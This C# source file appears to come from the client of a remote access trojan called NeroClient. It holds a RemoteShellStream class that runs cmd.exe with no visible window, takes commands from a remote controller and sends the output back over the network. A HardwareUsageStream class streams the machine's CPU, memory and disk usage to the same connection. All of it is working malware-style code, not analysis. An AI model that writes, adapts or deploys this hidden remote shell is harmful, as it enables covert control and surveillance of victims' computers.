using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NeroClient.Helpers.Services
{
    public static class RemoteShellStream
    {
        private static Thread RemoteShellThread = new Thread(StartRemoteShell);
        private static bool RemoteShellActive { get; set; }
        private static string LastInput { get; set; }
        public static string Input { get; set; }
        public static bool WriteLine { get; set; }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!RemoteShellActive)
            {
                RemoteShellActive = true;
                try
                {
                    RemoteShellThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (RemoteShellActive)
            {
                RemoteShellActive = false;
                try
                {
                    RemoteShellThread.Abort();
                    RemoteShellThread = new Thread(StartRemoteShell);
                }
                catch { }
            }
        }

        private static void StartRemoteShell()
        {
            Process Shell = new Process();
            Shell.StartInfo.FileName = "cmd.exe";
            Shell.StartInfo.CreateNoWindow = true;
            Shell.StartInfo.UseShellExecute = false;
            Shell.StartInfo.RedirectStandardOutput = true;
            Shell.StartInfo.RedirectStandardInput = true;
            Shell.StartInfo.RedirectStandardError = true;
            Shell.OutputDataReceived += OutputHandler;
            Shell.Start();
            Shell.BeginOutputReadLine();
            while (RemoteShellActive)
            {
                if (!WriteLine) continue;
                LastInput = Input;
                Shell.StandardInput.WriteLine(Input);
                WriteLine = false;
            }
        }

        private static void OutputHandler(object SendingProcess, DataReceivedEventArgs OutData)
        {
            StringBuilder Output = new StringBuilder();
            if (!string.IsNullOrEmpty(OutData.Data))
                try
                {
                    Output.Append(OutData.Data);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int) DataType.RemoteShellType);
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Output.ToString()));
                    Networking.Networking.MainClient.Send(ToSend.ToArray());
                }
                catch { }
        }
    }

    public static class HardwareUsageStream
    {
        private static Thread HardwareUsageThread = new Thread(StartHardwareUsage);
        public static bool HardwareUsageActive { get; set; }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!HardwareUsageActive)
            {
                HardwareUsageActive = true;
                try
                {
                    HardwareUsageThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (HardwareUsageActive)
            {
                HardwareUsageActive = false;
                try
                {
                    HardwareUsageThread.Abort();
                    HardwareUsageThread = new Thread(StartHardwareUsage);
                }
                catch { }
            }
        }

        public static void StartHardwareUsage()
        {
            PerformanceCounter PCCPU = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            PerformanceCounter PCMEM = new PerformanceCounter("Memory", "Available MBytes");
            PerformanceCounter PCDISK = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
            while (HardwareUsageActive)
            {
                string Values = "{" + PCCPU.NextValue() + "}[" + PCMEM.NextValue() + "]<" + PCDISK.NextValue() + ">";
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.HardwareUsageType);
                ToSend.AddRange(Encoding.ASCII.GetBytes(Values));
                Networking.Networking.MainClient.Send(ToSend.ToArray());
                Thread.Sleep(500);
            }
        }
    }
}